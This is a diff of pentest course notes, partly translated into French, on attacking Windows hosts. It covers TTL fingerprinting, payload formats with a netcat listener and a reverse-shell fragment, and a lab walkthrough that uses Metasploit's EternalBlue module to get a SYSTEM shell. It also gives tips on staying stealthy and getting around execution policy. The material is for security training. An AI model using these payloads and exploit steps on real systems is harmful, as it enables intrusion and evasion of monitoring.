@@ -19,8 +19,10 @@ For example, just in the last five years, there have been `3688` reported vulner
 ### <mark style="color:red;">Enumerating Windows & Fingerprinting Methods</mark>
 
 {% hint style="warning" %}
-Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. **A typical response from a Windows host will either be 32 or 128**. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output `below`, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out&#x20;
-
+* Utiliser le TTL dans les réponses ICMP (ping) peut aider à deviner le système d’exploitation.
+* Les hôtes Windows renvoient typiquement un TTL de **32** ou **128** — **128** étant le plus courant.
+* Le TTL diminue à chaque saut (hop), donc si vous êtes dans le même réseau L3 la valeur restera proche ; au-delà d’une vingtaine de hops, les recouvrements possibles avec d’autres OS deviennent plus probables.
+* Ce n’est qu’un **indice heuristique** (utile mais non fiable à 100 %) — par exemple, un ping vers un Windows 10 renverra souvent TTL = 128.&#x20;
 * This [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.
 {% endhint %}
 
@@ -111,7 +113,12 @@ MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
 
 ### <mark style="color:red;">Bats, DLLs, & MSI Files, Oh My!</mark>
 
-When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.
+* Pour Windows, plusieurs formats de payload sont courants : **DLL**, **.bat (batch)**, **MSI** et **scripts PowerShell**.
+* Chaque type peut réaliser des actions différentes (chargement en mémoire, exécution persistante, installation, exécution de commandes), mais tous sont exécutables sur la cible.
+* Le choix du format dépend largement du **mécanisme de livraison** (par ex. email, exploit, exécution locale, installation), donc pensez d’abord à comment vous livrez le fichier.
+* Certains formats (ex. MSI, DLL) permettent une intégration/persistabilité plus « native », tandis que d’autres (batch, PowerShell) sont plus simples et rapides à lancer.
+
+***
 
 <mark style="color:green;">**Payload Types to Consider**</mark>
 
@@ -131,6 +138,8 @@ return 0;
 }
 ```
 
+***
+
 <mark style="color:orange;">**Fichiers Batch**</mark>
 
 Les fichiers batch sont des **scripts textuels** utilisés par les administrateurs système pour effectuer automatiquement **plusieurs tâches** via l’**interpréteur de commandes** (comme `cmd.exe` sous Windows).
@@ -147,6 +156,8 @@ netstat -an > C:\temp\network_connections.txt // Enregistre les connexions rése
 start cmd.exe /c "nc -l -p 4444" // Écoute sur le port 4444
 ```
 
+***
+
 <mark style="color:orange;">**VBS (VBScript)**</mark>
 
 VBScript est un langage de script léger basé sur Visual Basic de Microsoft. Il est utilisé comme langage de script côté client dans les serveurs web pour permettre des pages web dynamiques. Bien que VBS soit désuet et désactivé dans la plupart des navigateurs modernes, il est encore utilisé dans le contexte du phishing et d'autres attaques.
@@ -158,6 +169,8 @@ Set objShell = CreateObject("WScript.Shell")
 objShell.Run "cmd.exe /c echo Hello from VBS!"
 ```
 
+***
+
 <mark style="color:orange;">**Fichiers MSI**</mark>
 
 Les fichiers .MSI servent de base de données d'installation pour l'installateur Windows. Lorsqu'une nouvelle application est installée, l'installateur cherche le fichier .msi pour comprendre tous les composants nécessaires.
@@ -167,6 +180,8 @@ Exemple : Pour créer un payload sous forme de fichier .msi, nous pourrions util
 ```powershell
 msiexec /i C:\path\to\payload.msi // Exécute le fichier .msi
 ```
+
+***
 
 <mark style="color:orange;">**PowerShell**</mark>
 
@@ -193,7 +208,7 @@ $client.Close()
 
 ### <mark style="color:red;">Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution</mark>
 
-**Payload Generation**
+<mark style="color:green;">**Payload Generation**</mark>
 
 <table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Resource</strong></td><td><strong>Description</strong></td></tr><tr><td><code>MSFVenom &#x26; Metasploit-Framework</code></td><td><a href="https://github.com/rapid7/metasploit-framework">Source</a> MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.</td></tr><tr><td><code>Payloads All The Things</code></td><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.</td></tr><tr><td><code>Mythic C2 Framework</code></td><td><a href="https://github.com/its-a-feature/Mythic">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.</td></tr><tr><td><code>Nishang</code></td><td><a href="https://github.com/samratashok/nishang">Source</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.</td></tr><tr><td><code>Darkarmour</code></td><td><a href="https://github.com/bats3c/darkarmour">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.</td></tr></tbody></table>
 
@@ -239,8 +254,6 @@ En examinant un hôte, des protocoles tels que **FTP**, **TFTP**, **HTTP/S**, et
 
 1. <mark style="color:green;">**Enumerate The Host**</mark>
 
-Ping, Netcat, Nmap scans, and even Metasploit are all good options to start enumerating our potential victims. To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell.
-
 <mark style="color:orange;">**Enumerate the Host**</mark>
 
 ```shell-session
@@ -248,12 +261,14 @@ mrroboteLiot@htb[/htb]$ nmap -v -A 10.129.201.97
 
 ```
 
-It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services. Now that we have gathered some information let's determine our potential exploit path.\
-`IIS` could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.
+Hôte identifié : **Windows Server 2016 Standard (6.3)** — on a le nom de machine et on sait qu’il **n’est pas joint à un domaine**.
+
+* Plusieurs services exposés — il faut en tenir compte pour choisir la voie d’attaque potentielle.
+* Vecteurs plausibles : **IIS** (service web), **SMB** (accès/abuse via outils comme Impacket ou via authentification si on possède des identifiants), ou une **faiblesse côté OS** menant à une RCE.
+* MS17‑010 (EternalBlue) affecte les versions Windows allant de 2008 à Server 2016 — la cible se situe dans cette plage, donc c’est un candidat plausible.
+* Pour confirmer, on peut utiliser un **module de vérification** (ex. l’auxiliaire `auxiliary/scanner/smb/smb_ms17_010` dans Metasploit) afin d’évaluer la présence de la vulnérabilité.
 
 2. <mark style="color:green;">**Search for and decide on an exploit path**</mark>
-
-Open `msfconsole` and search for EternalBlue, or you can use the string in the session below to use the check. Set the RHOSTS field with the target's IP address and initiate the scan. As can be seen in the options for the module, you can fill in more of the SMB settings, but it is not necessary. They will help to make the check more likely to succeed. When ready, type `run`.
 
 <mark style="color:orange;">**Determine an Exploit Path**</mark>
 
@@ -262,23 +277,6 @@ Open `msfconsole` and search for EternalBlue, or you can use the string in the s
 msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
 msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
 
-Module options (auxiliary/scanner/smb/smb_ms17_010):
-
-   Name         Current Setting                 Required  Description
-   ----         ---------------                 --------  -----------
-   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
-   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
-   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
-   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
-                k/data/wordlists/named_pipes.t
-                xt
-   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
-                                                          ile with syntax 'file:<path>'
-   RPORT        445                             yes       The SMB service port (TCP)
-   SMBDomain    .                               no        The Windows domain to use for authentication
-   SMBPass                                      no        The password for the specified username
-   SMBUser                                      no        The username to authenticate as
-   THREADS      1                               yes       The number of concurrent threads (max one per host)
 
 msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
 
@@ -290,8 +288,6 @@ msf6 auxiliary(scanner/smb/smb_ms17_010) > run
 [*] Auxiliary module execution completed
 ```
 {% endcode %}
-
-Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.
 
 3. <mark style="color:green;">**Select Exploit & Payload, then Deliver**</mark>
 
@@ -310,8 +306,6 @@ Matching Modules
 ```
 {% endcode %}
 
-For this instance, we dug through MSF's exploit modules utilizing the search function to look for an exploit matching EternalBlue. The list above was the result. Since I have had more luck with the `psexec` version of this exploit, we will try that one first. Let's choose it and continue the setup.
-
 <mark style="color:orange;">**Configure The Exploit & Payload**</mark>
 
 {% code fullWidth="true" %}
@@ -322,15 +316,13 @@ msf6 exploit(windows/smb/ms17_010_psexec) > options
 ```
 {% endcode %}
 
-**Validate Our Options**
+<mark style="color:orange;">**Validate Our Options**</mark>
 
 {% code fullWidth="true" %}
 ```shell-session
 msf6 exploit(windows/smb/ms17_010_psexec) > show options
 ```
 {% endcode %}
-
-This time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` payload. You can change this as you wish for a different shell type or obfuscate your attack more, as shown in the previous payloads sections. With our options set, let's give this a try and see if we land a shell.
 
 4. <mark style="color:green;">**Execute Attack, and Receive A Callback.**</mark>
 
@@ -364,26 +356,25 @@ C:\Windows\system32>
 ```
 {% endcode %}
 
-When we executed the Meterpreter command `shell`, it started another process on the host and dropped us into a system shell. Can you determine what we are in from the prompt? Just seeing `C:\Windows\system32>` can clue us in that we are just in a `cmd.exe shell`. To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like `PS C:\Windows\system32>`. The PS in front lets us know it is a PowerShell session. Congrats on dropping into a shell on our latest exploited Windows host.
-
 ***
 
 ### <mark style="color:red;">CMD-Prompt and Power\[Shell]s for Fun and Profit.</mark>
 
-CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as `Execution Policy` and `User Account Control (UAC)` can inhibit your ability to execute commands and scripts on the host. These considerations affect `PowerShell` but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:
+* **CMD** est l’interpréteur MS‑DOS historique : simple, texte en entrée/sortie, scripts batch basiques, et souvent présent sur les vieux systèmes (XP et antérieurs).
+* **PowerShell** est une console moderne basée sur .NET : elle comprend les cmdlets, manipule des objets .NET (pas juste du texte) et permet des scripts puissants et modulaires.
+* **Traçabilité / furtivité** : CMD laisse moins de traces en session ; PowerShell conserve l’historique et peut être plus surveillé (Execution Policy, journalisation).
+* **Compatibilité** : sur des hôtes très anciens sans PowerShell, CMD est parfois la seule option. PowerShell débarque à partir de Windows 7.
+* **Contraintes** : UAC et les politiques d’exécution peuvent empêcher PowerShell (moins d’impact sur CMD).
 
-Use `CMD` when:
+Quand utiliser CMD :
 
-* You are on an older host that may not include PowerShell.
-* When you only require simple interactions/access to the host.
-* When you plan to use simple batch files, net commands, or MS-DOS native tools.
-* When you believe that execution policies may affect your ability to run scripts or other actions on the host.
+* hôte ancien sans PowerShell ;
+* besoin d’interactions simples (batch, commandes net, outils MS‑DOS) ;
+* priorité à la furtivité ou contournement d’exécution de scripts.
 
-Use `PowerShell` when:
+Quand utiliser PowerShell :
 
-* You are planning to utilize cmdlets or other custom-built scripts.
-* When you wish to interact with .NET objects instead of text output.
-* When being stealthy is of lesser concern.
-* If you are planning to interact with cloud-based services and hosts.
-* If your scripts set and use Aliases.
+* besoin de cmdlets, modules .NET ou scripts complexes ;
+* interaction avec objets .NET ou services cloud ;
+* on privilégie la puissance et la flexibilité plutôt que la discrétion.
 
